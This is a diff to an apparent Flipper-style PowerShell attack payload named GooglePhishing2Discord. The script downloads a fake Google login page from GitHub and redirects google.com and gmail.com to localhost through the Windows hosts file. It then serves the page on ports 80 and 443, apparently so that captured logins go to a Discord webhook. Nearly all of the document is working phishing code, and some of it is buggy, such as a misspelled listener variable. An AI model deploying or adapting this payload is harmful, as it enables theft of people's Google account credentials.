@@ -1,4 +1,8 @@
-$hostString = "127.0.0.1 accounts.google.com";
+if(-not (Test-Path -Path "$env:temp\gph.html" -PathType Leaf)){
+    Invoke-RestMethod "https://raw.githubusercontent.com/Agente404/flipper/main/payloads/GooglePhishing2Discord/index.html" -OutFile "$env:temp\gph.html" | Wait-Process;
+}
+
+$hostString = "127.0.0.1 google.com`n127.0.0.1 gmail.com";
 $isModified = Select-String C:\Windows\System32\Drivers\etc\hosts -Pattern $hostString;
 
 if ($null -eq $isModified ) {    
@@ -8,14 +12,16 @@ if ($null -eq $isModified ) {
 
 $url = 'http://127.0.0.1';
 $hook="";
-$pageCode = Get-Content "index.html" -Encoding UTF8 -Raw;
+$pageCode = Get-Content "gph.html" -Encoding UTF8 -Raw;
 
-$http = New-Object System.Net.HttpListener;
-$http.Prefixes.Add($url + ':80/');
-$http.Start();
+function Handle-Request{    
+    [CmdletBinding()]
+	param (
+		[parameter(Position=0,Mandatory=$True)]
+		[System.Net.HttpListener]$listener,
+	);
 
-while ($http.IsListening) {
-    $context = $http.GetContext();  
+    $context = $listner.GetContext();  
      
     if ($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -eq '/') {
         $buffer = [Text.Encoding]::UTF8.GetBytes($pageCode);
@@ -41,7 +47,22 @@ while ($http.IsListening) {
         $context.Response.OutputStream.Write($buffer, 0, $buffer.length);
         $context.Response.Close();
 
-        $http.Stop();
+        $listner.Stop();
     }
+}
 
+$http = New-Object System.Net.HttpListener;
+$http.Prefixes.Add($url + ':80/');
+$http.Start();
+
+while ($http.IsListening) {
+    Handle-Request $http
+}
+
+$https = New-Object System.Net.HttpListener;
+$https.Prefixes.Add($url + ':443/');
+$https.Start();
+
+while ($https.IsListening) {
+    Handle-Request $https
 }
